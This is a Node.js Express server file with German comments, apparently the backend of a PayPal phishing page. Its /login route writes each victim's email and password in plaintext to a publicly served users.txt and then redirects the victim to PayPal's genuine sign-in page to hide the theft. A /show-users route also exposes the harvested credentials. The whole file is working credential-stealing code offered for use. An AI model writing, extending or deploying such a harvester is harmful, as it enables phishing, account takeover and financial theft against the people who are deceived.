const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const DATA_FILE = path.join(__dirname, "public/users.txt");

// Stelle sicher, dass die Datei existiert
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, "", "utf8");
}

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, "public")));

// Login-Route: schreibt E-Mail und Passwort in users.txt
app.post("/login", (req, res) => {
  const { email, password } = req.body;
  const line = `${new Date().toISOString()} | ${email} | ${password}\n`;

  // Anhängen an die Datei
  fs.appendFile(DATA_FILE, line, "utf8", (err) => {
    if (err) {
      console.error("Fehler beim Schreiben:", err);
      return res.status(500).send("Serverfehler");
    }
    // Nach dem Speichern weiterleiten
    res.redirect("https://www.paypal.com/signin");
  });
});

// Server starten
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server läuft auf Port ${PORT}`);
});

// noch in index.js
app.get("/show-users", (req, res) => {
  const dataPath = path.join(__dirname, "/public/users.txt");
  res.sendFile(dataPath, (err) => {
    if (err) {
      console.error("Fehler beim Lesen der Datei:", err);
      res.status(500).send("Konnte Datei nicht laden");
    }
  });
});
